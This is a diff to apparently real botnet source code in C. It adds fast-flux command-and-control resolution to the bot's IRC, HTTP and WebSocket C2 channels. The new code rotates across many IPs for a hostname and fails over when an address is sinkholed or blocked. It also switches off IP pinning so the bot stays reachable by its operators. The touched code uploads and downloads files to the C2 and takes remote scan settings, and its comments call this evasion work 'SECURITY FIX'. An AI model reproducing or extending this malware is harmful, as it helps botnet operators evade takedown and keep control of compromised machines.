@@ -22,6 +22,141 @@
 #include <time.h>
 #include <stdarg.h>
 
+/* ── Fast-Flux C2 (#85) ──────────────────────────────────────── */
+/* When flux_enabled=1 the C2 channels resolve ALL A records of their
+ * configured hostname into a per-hostname cache, rotate the active IP
+ * every flux_ttl seconds, and re-resolve at the same low TTL. A
+ * connect or recv timeout advances the active index immediately
+ * (failover), so a sinkholed or blocked IP is abandoned on the next
+ * attempt instead of being retried forever. */
+typedef struct {
+    char hostname[256];                 /* C2 hostname this slot serves */
+    struct in_addr ips[FLUX_MAX_IPS];   /* all A records, network order */
+    int count;                          /* number of cached IPs */
+    int index;                          /* active IP (rotates) */
+    time_t cache_time;                  /* last successful re-resolution */
+    time_t last_rotate;                 /* last rotation / failover */
+} flux_cache_t;
+
+static flux_cache_t g_flux_cache[FLUX_CACHE_SLOTS];
+
+/* Locate the cache slot for hostname, or NULL if not cached. */
+static flux_cache_t *flux_cache_find(const char *hostname) {
+    for (int i = 0; i < FLUX_CACHE_SLOTS; i++) {
+        if (g_flux_cache[i].hostname[0] != '\0' &&
+            strcmp(g_flux_cache[i].hostname, hostname) == 0) {
+            return &g_flux_cache[i];
+        }
+    }
+    return NULL;
+}
+
+/* Find the slot for hostname, evicting the least-recently-used slot
+ * when the cache is full. */
+static flux_cache_t *flux_cache_acquire(const char *hostname) {
+    flux_cache_t *slot = flux_cache_find(hostname);
+    if (slot) return slot;
+
+    int victim = 0;
+    for (int i = 1; i < FLUX_CACHE_SLOTS; i++) {
+        if (g_flux_cache[i].hostname[0] == '\0') { victim = i; break; }
+        if (g_flux_cache[i].last_rotate < g_flux_cache[victim].last_rotate)
+            victim = i;
+    }
+    slot = &g_flux_cache[victim];
+    memset(slot, 0, sizeof(*slot));
+    strncpy(slot->hostname, hostname, sizeof(slot->hostname) - 1);
+    return slot;
+}
+
+/* Resolve every A record of hostname into slot. Returns 0 with
+ * count >= 1 on success, -1 on failure. The previous active index is
+ * preserved so a re-resolution does not force an immediate jump. */
+static int flux_resolve(flux_cache_t *slot, const char *hostname) {
+    struct addrinfo hints, *res, *rp;
+    memset(&hints, 0, sizeof(hints));
+    hints.ai_family = AF_INET;   /* IPv4 only, like protocol_resolve_host */
+    hints.ai_socktype = SOCK_STREAM;
+
+    int err = getaddrinfo(hostname, NULL, &hints, &res);
+    if (err != 0) {
+        log_warn("FLUX: resolution failed for %s: %s", hostname, gai_strerror(err));
+        return -1;
+    }
+
+    int n = 0;
+    for (rp = res; rp && n < FLUX_MAX_IPS; rp = rp->ai_next) {
+        if (rp->ai_family == AF_INET) {
+            struct sockaddr_in *sin = (struct sockaddr_in *)rp->ai_addr;
+            slot->ips[n++] = sin->sin_addr;
+        }
+    }
+    freeaddrinfo(res);
+
+    if (n == 0) {
+        log_warn("FLUX: no A records for %s", hostname);
+        return -1;
+    }
+    slot->count = n;
+    return 0;
+}
+
+/* Pick the active flux IP for hostname, re-resolving and rotating as
+ * the flux_ttl interval dictates. Returns 0 with *out filled, or -1
+ * when no IP is available at all. Callers only use this when
+ * flux_enabled is set. */
+static int flux_pick_ip(notnet_bot_t *bot, const char *hostname, struct in_addr *out) {
+    time_t now = time(NULL);
+    flux_cache_t *slot = flux_cache_acquire(hostname);
+
+    int fresh = (slot->count == 0);
+    if (fresh || now - slot->cache_time >= (time_t)bot->flux_ttl) {
+        if (flux_resolve(slot, hostname) == 0) {
+            slot->cache_time = now;
+            if (fresh) {
+                /* New set: begin at index 0; last_rotate is set so the
+                 * first rotation waits a full interval. */
+                slot->index = 0;
+                slot->last_rotate = now;
+            }
+        } else if (fresh) {
+            /* Nothing cached and nothing resolved — hard failure. */
+            return -1;
+        } else {
+            log_warn("FLUX: re-resolution failed for %s, keeping %d cached IP(s)",
+                     hostname, slot->count);
+        }
+    }
+
+    /* Clamp in case the record set shrank. */
+    if (slot->index >= slot->count) slot->index = 0;
+
+    /* Periodic rotation to the next A record. */
+    if (slot->count > 1 && now - slot->last_rotate >= (time_t)bot->flux_ttl) {
+        slot->index = (slot->index + 1) % slot->count;
+        slot->last_rotate = now;
+        log_debug("FLUX: rotating %s to %s (%d/%d)", hostname,
+                  inet_ntoa(slot->ips[slot->index]),
+                  slot->index + 1, slot->count);
+    }
+
+    *out = slot->ips[slot->index];
+    return 0;
+}
+
+/* Advance the active IP after a connect/recv failure so the next
+ * attempt targets the next A record. No-op when flux is disabled or
+ * the hostname has a single record. */
+static void flux_mark_failed(notnet_bot_t *bot, const char *hostname) {
+    if (!bot->flux_enabled) return;
+    flux_cache_t *slot = flux_cache_find(hostname);
+    if (!slot || slot->count <= 1) return;
+    slot->index = (slot->index + 1) % slot->count;
+    slot->last_rotate = time(NULL);
+    log_warn("FLUX: %s unreachable, failing over to next IP %s", hostname,
+             inet_ntoa(slot->ips[slot->index]));
+}
+
 /* ── IRC Implementation ───────────────────────────────────────── */
 static int irc_create_socket(notnet_bot_t *bot) {
     /* SECURITY FIX (#3): Use AF_INET + IPPROTO_TCP (not IPPROTO_IPV6).
@@ -51,24 +186,36 @@ static int irc_create_socket(notnet_bot_t *bot) {
      * accepts dotted-quad and rejects hostnames. For hostname resolution
      * use getaddrinfo with AF_INET filtering. */
     if (inet_pton(AF_INET, bot->c2_irc.server, &addr.sin_addr) != 1) {
-        /* Not a dotted-quad; try DNS resolution and use safe copy */
-        int resolved = protocol_resolve_host(bot->c2_irc.server);
-        if (resolved == (int)INADDR_NONE) {
-            log_error("IRC: DNS resolution failed for %s", bot->c2_irc.server);
-            close(sock);
-            return -1;
-        }
-        addr.sin_addr.s_addr = (in_addr_t)resolved;
-        if (addr.sin_addr.s_addr == INADDR_NONE) {
-            log_error("IRC: invalid address for %s", bot->c2_irc.server);
-            close(sock);
-            return -1;
+        /* SECURITY FIX (#85): In flux mode use the rotating cache of
+         * all A records; otherwise a single resolution as before. */
+        if (bot->flux_enabled) {
+            if (flux_pick_ip(bot, bot->c2_irc.server, &addr.sin_addr) != 0) {
+                log_error("IRC: flux resolution failed for %s", bot->c2_irc.server);
+                close(sock);
+                return -1;
+            }
+        } else {
+            /* Not a dotted-quad; try DNS resolution and use safe copy */
+            int resolved = protocol_resolve_host(bot->c2_irc.server);
+            if (resolved == (int)INADDR_NONE) {
+                log_error("IRC: DNS resolution failed for %s", bot->c2_irc.server);
+                close(sock);
+                return -1;
+            }
+            addr.sin_addr.s_addr = (in_addr_t)resolved;
+            if (addr.sin_addr.s_addr == INADDR_NONE) {
+                log_error("IRC: invalid address for %s", bot->c2_irc.server);
+                close(sock);
+                return -1;
+            }
         }
     }
     
     /* SECURITY FIX (#10): DNS pinning — on reconnect, verify the resolved
-     * IP matches the pinned IP from the first successful auth. */
-    if (bot->c2_irc.dns_pinned) {
+     * IP matches the pinned IP from the first successful auth.
+     * SECURITY FIX (#85): skipped in flux mode — the whole point is that
+     * the peer IP rotates. */
+    if (!bot->flux_enabled && bot->c2_irc.dns_pinned) {
         if (addr.sin_addr.s_addr != bot->c2_irc.pinned_addr.s_addr) {
             log_warn("IRC: DNS rebinding detected! Pinned %s, resolved %s — rejecting",
                      inet_ntoa(bot->c2_irc.pinned_addr), inet_ntoa(addr.sin_addr));
@@ -81,6 +228,7 @@ static int irc_create_socket(notnet_bot_t *bot) {
     int connect_err = connect(sock, (struct sockaddr *)&addr, sizeof(addr));
     if (connect_err < 0 && errno != EINPROGRESS) {
         log_error("IRC: connect() failed: %s", strerror(errno));
+        flux_mark_failed(bot, bot->c2_irc.server);
         close(sock);
         return -1;
     }
@@ -95,6 +243,7 @@ static int irc_create_socket(notnet_bot_t *bot) {
     
     if (select(sock + 1, NULL, &fds, NULL, &tv) <= 0) {
         log_error("IRC: connect() timed out");
+        flux_mark_failed(bot, bot->c2_irc.server);
         close(sock);
         return -1;
     }
@@ -105,6 +254,7 @@ static int irc_create_socket(notnet_bot_t *bot) {
     getsockopt(sock, SOL_SOCKET, SO_ERROR, &so_error, &len);
     if (so_error != 0) {
         log_error("IRC: connect() failed: %s", strerror(so_error));
+        flux_mark_failed(bot, bot->c2_irc.server);
         close(sock);
         return -1;
     }
@@ -116,6 +266,7 @@ static int irc_create_socket(notnet_bot_t *bot) {
      * configured (make TLS=1 + tls_cert_pin_sha256=). */
     if (tls_setup(&bot->c2_irc.tls, sock, bot->c2_irc.server,
                   bot->tls_cert_pin_sha256) != 0) {
+        flux_mark_failed(bot, bot->c2_irc.server);
         close(sock);
         return -1;
     }
@@ -197,6 +348,9 @@ int irc_read(notnet_bot_t *bot, char *buf, int len) {
     int received = chan_recv(&bot->c2_irc.tls, bot->c2_irc.sock, buf, len);
     if (received <= 0) {
         log_info("IRC: connection closed");
+        /* SECURITY FIX (#85): advance the flux IP so the reconnect
+         * targets the next A record. */
+        flux_mark_failed(bot, bot->c2_irc.server);
         bot->c2_irc.connected = 0;
         close(bot->c2_irc.sock);
         bot->c2_irc.sock = -1;
@@ -242,8 +396,9 @@ int irc_read(notnet_bot_t *bot, char *buf, int len) {
             if (strncmp(code, "366", 3) == 0 && (code[3] == ' ' || code[3] == '\0')) {
                 log_info("IRC: joined channel %s", bot->c2_irc.channel);
                 bot->c2_irc.authenticated = 1;
-                /* SECURITY FIX (#10): Pin the connected peer IP on first auth */
-                if (!bot->c2_irc.dns_pinned) {
+                /* SECURITY FIX (#10): Pin the connected peer IP on first auth.
+                 * SECURITY FIX (#85): skipped in flux mode — the peer IP rotates. */
+                if (!bot->flux_enabled && !bot->c2_irc.dns_pinned) {
                     struct sockaddr_in sin;
                     socklen_t slen = sizeof(sin);
                     getpeername(bot->c2_irc.sock, (struct sockaddr *)&sin, &slen);
@@ -264,8 +419,9 @@ int irc_read(notnet_bot_t *bot, char *buf, int len) {
             if (strncmp(code, "376", 3) == 0 && (code[3] == ' ' || code[3] == '\0')) {
                 log_info("IRC: MOTD complete, authenticated");
                 bot->c2_irc.authenticated = 1;
-                /* SECURITY FIX (#10): Pin the connected peer IP on first auth */
-                if (!bot->c2_irc.dns_pinned) {
+                /* SECURITY FIX (#10): Pin the connected peer IP on first auth.
+                 * SECURITY FIX (#85): skipped in flux mode — the peer IP rotates. */
+                if (!bot->flux_enabled && !bot->c2_irc.dns_pinned) {
                     struct sockaddr_in sin;
                     socklen_t slen = sizeof(sin);
                     getpeername(bot->c2_irc.sock, (struct sockaddr *)&sin, &slen);
@@ -402,15 +558,27 @@ int http_connect(notnet_bot_t *bot) {
     /* SECURITY FIX (#3): Use inet_pton + safe fallback instead of
      * gethostbyname + memcpy (h_length overflow on IPv6 results). */
     if (inet_pton(AF_INET, bot->c2_http.server, &addr.sin_addr) != 1) {
-        addr.sin_addr.s_addr = (in_addr_t)protocol_resolve_host(bot->c2_http.server);
-        if (addr.sin_addr.s_addr == INADDR_NONE) {
-            close(sock);
-            return -1;
+        /* SECURITY FIX (#85): In flux mode use the rotating cache of
+         * all A records; otherwise a single resolution as before. */
+        if (bot->flux_enabled) {
+            if (flux_pick_ip(bot, bot->c2_http.server, &addr.sin_addr) != 0) {
+                log_error("HTTP: flux resolution failed for %s", bot->c2_http.server);
+                close(sock);
+                return -1;
+            }
+        } else {
+            addr.sin_addr.s_addr = (in_addr_t)protocol_resolve_host(bot->c2_http.server);
+            if (addr.sin_addr.s_addr == INADDR_NONE) {
+                close(sock);
+                return -1;
+            }
         }
     }
     
-    /* SECURITY FIX (#10): DNS pinning for HTTP C2 */
-    if (bot->c2_http.dns_pinned && addr.sin_addr.s_addr != bot->c2_http.pinned_addr.s_addr) {
+    /* SECURITY FIX (#10): DNS pinning for HTTP C2.
+     * SECURITY FIX (#85): skipped in flux mode — the peer IP rotates. */
+    if (!bot->flux_enabled && bot->c2_http.dns_pinned &&
+        addr.sin_addr.s_addr != bot->c2_http.pinned_addr.s_addr) {
         log_warn("HTTP: DNS rebinding detected! Pinned %s, resolved %s — rejecting",
                  inet_ntoa(bot->c2_http.pinned_addr), inet_ntoa(addr.sin_addr));
         close(sock);
@@ -419,6 +587,7 @@ int http_connect(notnet_bot_t *bot) {
     
     int connect_err = connect(sock, (struct sockaddr *)&addr, sizeof(addr));
     if (connect_err < 0 && errno != EINPROGRESS) {
+        flux_mark_failed(bot, bot->c2_http.server);
         close(sock);
         return -1;
     }
@@ -432,6 +601,7 @@ int http_connect(notnet_bot_t *bot) {
     tv.tv_usec = 0;
     
     if (select(sock + 1, NULL, &fds, NULL, &tv) <= 0) {
+        flux_mark_failed(bot, bot->c2_http.server);
         close(sock);
         return -1;
     }
@@ -440,6 +610,7 @@ int http_connect(notnet_bot_t *bot) {
     socklen_t len = sizeof(so_error);
     getsockopt(sock, SOL_SOCKET, SO_ERROR, &so_error, &len);
     if (so_error != 0) {
+        flux_mark_failed(bot, bot->c2_http.server);
         close(sock);
         return -1;
     }
@@ -449,6 +620,7 @@ int http_connect(notnet_bot_t *bot) {
     /* SECURITY FIX (#76): Upgrade to TLS + verify cert pin when configured. */
     if (tls_setup(&bot->c2_http.tls, sock, bot->c2_http.server,
                   bot->tls_cert_pin_sha256) != 0) {
+        flux_mark_failed(bot, bot->c2_http.server);
         close(sock);
         return -1;
     }
@@ -509,9 +681,28 @@ int http_get(notnet_bot_t *bot, char *buf, int len) {
      * socket; issuing a GET on the same socket risks attributing the GET
      * response to a pending POST response (or vice versa). A dedicated
      * Connection: close request isolates the request/response pair. */
-    int sock = tcp_connect_sock(bot, bot->c2_http.server, bot->c2_http.port);
+    /* SECURITY FIX (#85): In flux mode connect to the current rotating
+     * C2 IP. The Host header below keeps the configured hostname so
+     * virtual-host routing on the C2 side still works. */
+    char flux_ip[INET_ADDRSTRLEN];
+    const char *host = bot->c2_http.server;
+    if (bot->flux_enabled) {
+        struct in_addr fa;
+        if (flux_pick_ip(bot, bot->c2_http.server, &fa) != 0) {
+            log_warn("HTTP: GET flux resolution failed for %s", bot->c2_http.server);
+            return -1;
+        }
+        if (!inet_ntop(AF_INET, &fa, flux_ip, sizeof(flux_ip))) {
+            log_warn("HTTP: GET flux IP formatting failed");
+            return -1;
+        }
+        host = flux_ip;
+    }
+
+    int sock = tcp_connect_sock(bot, host, bot->c2_http.port);
     if (sock < 0) {
         log_warn("HTTP: GET connect failed: %s", strerror(errno));
+        flux_mark_failed(bot, bot->c2_http.server);
         return -1;
     }
 
@@ -544,7 +735,12 @@ int http_get(notnet_bot_t *bot, char *buf, int len) {
         tv.tv_usec = 0;
 
         int sel = select(sock + 1, &read_fds, NULL, NULL, &tv);
-        if (sel <= 0) break;  /* timeout or error */
+        if (sel <= 0) {
+            /* SECURITY FIX (#85): recv timeout — treat the active flux
+             * IP as dead and advance on the next attempt. */
+            flux_mark_failed(bot, bot->c2_http.server);
+            break;  /* timeout or error */
+        }
 
         int received = recv(sock, buf + total, len - total - 1, 0);
         if (received <= 0) break;
@@ -579,6 +775,9 @@ int http_read(notnet_bot_t *bot, char *buf, int len) {
     log_info("HTTP: http_read recv returned %d", received);
     if (received <= 0) {
         log_info("HTTP: connection closed (recv=%d)", received);
+        /* SECURITY FIX (#85): advance the flux IP so the reconnect
+         * targets the next A record. */
+        flux_mark_failed(bot, bot->c2_http.server);
         bot->c2_http.connected = 0;
         close(bot->c2_http.sock);
         bot->c2_http.sock = -1;
@@ -598,7 +797,9 @@ int http_read(notnet_bot_t *bot, char *buf, int len) {
         struct sockaddr_in sin;
         socklen_t slen = sizeof(sin);
         if (getpeername(bot->c2_http.sock, (struct sockaddr *)&sin, &slen) == 0) {
-            if (!bot->c2_http.dns_pinned) {
+            /* SECURITY FIX (#85): no pinning in flux mode — the peer
+             * IP is expected to rotate. */
+            if (!bot->flux_enabled && !bot->c2_http.dns_pinned) {
                 bot->c2_http.pinned_addr = sin.sin_addr;
                 bot->c2_http.dns_pinned = 1;
                 log_info("HTTP: DNS pin set to %s after first response",
@@ -669,6 +870,7 @@ int http_download(notnet_bot_t *bot, const char *url, const char *dest) {
     char host[256];
     uint16_t port;
     char path[512];
+    int is_c2_fallback = 0;   /* SECURITY FIX (#85): flux only applies to the C2 endpoint */
 
     if (url && strncmp(url, "http://", 7) == 0) {
         char authority[256];
@@ -693,9 +895,24 @@ int http_download(notnet_bot_t *bot, const char *url, const char *dest) {
         if (slash) snprintf(path, sizeof(path), "%s", slash);
         else snprintf(path, sizeof(path), "/");
     } else {
+        is_c2_fallback = 1;
         snprintf(host, sizeof(host), "%s", bot->c2_http.server);
         port = bot->c2_http.port;
         snprintf(path, sizeof(path), "%s", bot->c2_http.path);
+    }
+
+    /* SECURITY FIX (#85): For the C2 endpoint in flux mode, connect via
+     * the current rotating IP but keep the hostname in the Host header
+     * (virtual-host routing on the C2 side still works). Explicit URLs
+     * are always fetched directly. */
+    const char *connect_host = host;
+    char flux_ip[INET_ADDRSTRLEN];
+    if (bot->flux_enabled && is_c2_fallback) {
+        struct in_addr fa;
+        if (flux_pick_ip(bot, host, &fa) == 0 &&
+            inet_ntop(AF_INET, &fa, flux_ip, sizeof(flux_ip))) {
+            connect_host = flux_ip;
+        }
     }
 
     /* Stream the response body to dest. The old implementation buffered
@@ -709,9 +926,10 @@ int http_download(notnet_bot_t *bot, const char *url, const char *dest) {
     int hdr_len = 0;
     int body_start = -1;   /* offset in hdr_buf where body begins, -1 until found */
 
-    int sock = tcp_connect_sock(bot, host, port);
+    int sock = tcp_connect_sock(bot, connect_host, port);
     if (sock < 0) {
         log_error("http_download: connect to %s:%u failed", host, port);
+        if (bot->flux_enabled && is_c2_fallback) flux_mark_failed(bot, host);
         return -1;
     }
 
@@ -873,6 +1091,7 @@ int http_upload(notnet_bot_t *bot, const char *file_path, const char *upload_pat
     char host[256];
     uint16_t port;
     char path[512];
+    int is_c2_fallback = 0;   /* SECURITY FIX (#85): flux only applies to the C2 endpoint */
 
     if (upload_path && strncmp(upload_path, "http://", 7) == 0) {
         char authority[256];
@@ -898,15 +1117,30 @@ int http_upload(notnet_bot_t *bot, const char *file_path, const char *upload_pat
         if (slash) snprintf(path, sizeof(path), "%s", slash);
         else snprintf(path, sizeof(path), "/");
     } else {
+        is_c2_fallback = 1;
         snprintf(host, sizeof(host), "%s", bot->c2_http.server);
         port = bot->c2_http.port;
         snprintf(path, sizeof(path), "%s", upload_path ? upload_path : bot->c2_http.path);
     }
 
+    /* SECURITY FIX (#85): For the C2 endpoint in flux mode, connect via
+     * the current rotating IP but keep the hostname in the Host header.
+     * Explicit URLs are always uploaded directly. */
+    const char *connect_host = host;
+    char flux_ip[INET_ADDRSTRLEN];
+    if (bot->flux_enabled && is_c2_fallback) {
+        struct in_addr fa;
+        if (flux_pick_ip(bot, host, &fa) == 0 &&
+            inet_ntop(AF_INET, &fa, flux_ip, sizeof(flux_ip))) {
+            connect_host = flux_ip;
+        }
+    }
+
     /* Connect to server */
-    int sock = tcp_connect_sock(bot, host, port);
+    int sock = tcp_connect_sock(bot, connect_host, port);
     if (sock < 0) {
         log_error("http_upload: connect to %s:%u failed", host, port);
+        if (bot->flux_enabled && is_c2_fallback) flux_mark_failed(bot, host);
         free(file_data);
         return -1;
     }
@@ -1090,15 +1324,27 @@ int ws_connect(notnet_bot_t *bot) {
     /* SECURITY FIX (#3): Use inet_pton + safe fallback instead of
      * gethostbyname + memcpy (h_length overflow on IPv6 results). */
     if (inet_pton(AF_INET, bot->c2_ws.server, &addr.sin_addr) != 1) {
-        addr.sin_addr.s_addr = (in_addr_t)protocol_resolve_host(bot->c2_ws.server);
-        if (addr.sin_addr.s_addr == INADDR_NONE) {
-            close(sock);
-            return -1;
+        /* SECURITY FIX (#85): In flux mode use the rotating cache of
+         * all A records; otherwise a single resolution as before. */
+        if (bot->flux_enabled) {
+            if (flux_pick_ip(bot, bot->c2_ws.server, &addr.sin_addr) != 0) {
+                log_error("WS: flux resolution failed for %s", bot->c2_ws.server);
+                close(sock);
+                return -1;
+            }
+        } else {
+            addr.sin_addr.s_addr = (in_addr_t)protocol_resolve_host(bot->c2_ws.server);
+            if (addr.sin_addr.s_addr == INADDR_NONE) {
+                close(sock);
+                return -1;
+            }
         }
     }
     
-    /* SECURITY FIX (#10): DNS pinning for WebSocket C2 */
-    if (bot->c2_ws.dns_pinned && addr.sin_addr.s_addr != bot->c2_ws.pinned_addr.s_addr) {
+    /* SECURITY FIX (#10): DNS pinning for WebSocket C2.
+     * SECURITY FIX (#85): skipped in flux mode — the peer IP rotates. */
+    if (!bot->flux_enabled && bot->c2_ws.dns_pinned &&
+        addr.sin_addr.s_addr != bot->c2_ws.pinned_addr.s_addr) {
         log_warn("WS: DNS rebinding detected! Pinned %s, resolved %s — rejecting",
                  inet_ntoa(bot->c2_ws.pinned_addr), inet_ntoa(addr.sin_addr));
         close(sock);
@@ -1107,6 +1353,7 @@ int ws_connect(notnet_bot_t *bot) {
     
     int connect_err = connect(sock, (struct sockaddr *)&addr, sizeof(addr));
     if (connect_err < 0 && errno != EINPROGRESS) {
+        flux_mark_failed(bot, bot->c2_ws.server);
         close(sock);
         return -1;
     }
@@ -1120,6 +1367,7 @@ int ws_connect(notnet_bot_t *bot) {
     tv.tv_usec = 0;
     
     if (select(sock + 1, NULL, &fds, NULL, &tv) <= 0) {
+        flux_mark_failed(bot, bot->c2_ws.server);
         close(sock);
         return -1;
     }
@@ -1128,6 +1376,7 @@ int ws_connect(notnet_bot_t *bot) {
     socklen_t len = sizeof(so_error);
     getsockopt(sock, SOL_SOCKET, SO_ERROR, &so_error, &len);
     if (so_error != 0) {
+        flux_mark_failed(bot, bot->c2_ws.server);
         close(sock);
         return -1;
     }
@@ -1137,6 +1386,7 @@ int ws_connect(notnet_bot_t *bot) {
      * 101 response ride inside the encrypted tunnel. */
     if (tls_setup(&bot->c2_ws.tls, sock, bot->c2_ws.server,
                   bot->tls_cert_pin_sha256) != 0) {
+        flux_mark_failed(bot, bot->c2_ws.server);
         close(sock);
         return -1;
     }
@@ -1176,6 +1426,7 @@ int ws_connect(notnet_bot_t *bot) {
     int sent = chan_send(&bot->c2_ws.tls, sock, upgrade_req, req_len);
     if (sent != req_len) {
         log_warn("WS: upgrade request send failed: %s", strerror(errno));
+        flux_mark_failed(bot, bot->c2_ws.server);
         close(sock);
         return -1;
     }
@@ -1192,6 +1443,7 @@ int ws_connect(notnet_bot_t *bot) {
         tv.tv_usec = 0;
         if (select(sock + 1, &rfd, NULL, NULL, &tv) <= 0) {
             log_warn("WS: upgrade response timed out");
+            flux_mark_failed(bot, bot->c2_ws.server);
             close(sock);
             return -1;
         }
@@ -1210,6 +1462,7 @@ int ws_connect(notnet_bot_t *bot) {
         strncmp(response, "HTTP/1.0 101", 12) != 0) {
         log_warn("WS: no 101 Switching Protocols received — handshake failed (%.80s)",
                  response[0] ? response : "(empty response)");
+        flux_mark_failed(bot, bot->c2_ws.server);
         close(sock);
         return -1;
     }
@@ -1239,6 +1492,7 @@ int ws_connect(notnet_bot_t *bot) {
         log_warn("WS: missing Sec-WebSocket-Accept header");
     }
     if (!accept_ok) {
+        flux_mark_failed(bot, bot->c2_ws.server);
         close(sock);
         return -1;
     }
@@ -1248,8 +1502,9 @@ int ws_connect(notnet_bot_t *bot) {
     
     bot->c2_ws.sock = sock;
     bot->c2_ws.connected = 1;
-    /* SECURITY FIX (#10): Pin IP on first successful WS connection */
-    if (!bot->c2_ws.dns_pinned) {
+    /* SECURITY FIX (#10): Pin IP on first successful WS connection.
+     * SECURITY FIX (#85): skipped in flux mode — the peer IP rotates. */
+    if (!bot->flux_enabled && !bot->c2_ws.dns_pinned) {
         struct sockaddr_in sin;
         socklen_t slen = sizeof(sin);
         getpeername(sock, (struct sockaddr *)&sin, &slen);
@@ -1365,6 +1620,9 @@ int ws_read(notnet_bot_t *bot, char *buf, int len) {
     while (hdr_got < sizeof(frame_hdr)) {
         ssize_t r = chan_recv(&bot->c2_ws.tls, bot->c2_ws.sock, (char *)frame_hdr + hdr_got, sizeof(frame_hdr) - hdr_got);
         if (r <= 0) {
+            /* SECURITY FIX (#85): advance the flux IP so the reconnect
+             * targets the next A record. */
+            flux_mark_failed(bot, bot->c2_ws.server);
             bot->c2_ws.connected = 0;
             if (bot->c2_ws.sock >= 0) close(bot->c2_ws.sock);
             bot->c2_ws.sock = -1;
@@ -2093,6 +2351,20 @@ int protocol_process_commands(notnet_bot_t *bot) {
                 int v = atoi(value);
                 if (v >= 1 && v <= 65535) {
                     bot->scan_max_hosts = v;
+                    applied = 1;
+                }
+            } else if (strcmp(key, "flux_enabled") == 0) {
+                /* SECURITY FIX (#85): strict 0/1 toggle. Takes effect on
+                 * the next connect attempt. */
+                int v = atoi(value);
+                if (v == 0 || v == 1) {
+                    bot->flux_enabled = (uint8_t)v;
+                    applied = 1;
+                }
+            } else if (strcmp(key, "flux_ttl") == 0) {
+                int v = atoi(value);
+                if (v >= 1 && v <= 3600) {
+                    bot->flux_ttl = (uint32_t)v;
                     applied = 1;
                 }
             }
@@ -2872,6 +3144,19 @@ int load_config(notnet_bot_t *bot, const char *path) {
                 bot->scan_target_count = idx + 1;
                 strncpy(bot->scan_targets[idx], value, 255);
                 bot->scan_targets[idx][255] = '\0';
+            }
+        } else if (strcmp(key, "flux_enabled") == 0) {
+            /* SECURITY FIX (#85): fast-flux C2 toggle (default 0) */
+            bot->flux_enabled = (atoi(value) != 0);
+        } else if (strcmp(key, "flux_ttl") == 0) {
+            /* SECURITY FIX (#85): clamp like scan_interval — a 0 TTL
+             * would re-resolve on every connect. Accept 1..3600s. */
+            int v = atoi(value);
+            if (v >= 1 && v <= 3600) {
+                bot->flux_ttl = (uint32_t)v;
+            } else {
+                log_warn("Config: flux_ttl=%d out of range (1-3600), keeping %u",
+                         v, bot->flux_ttl);
             }
         }
     }
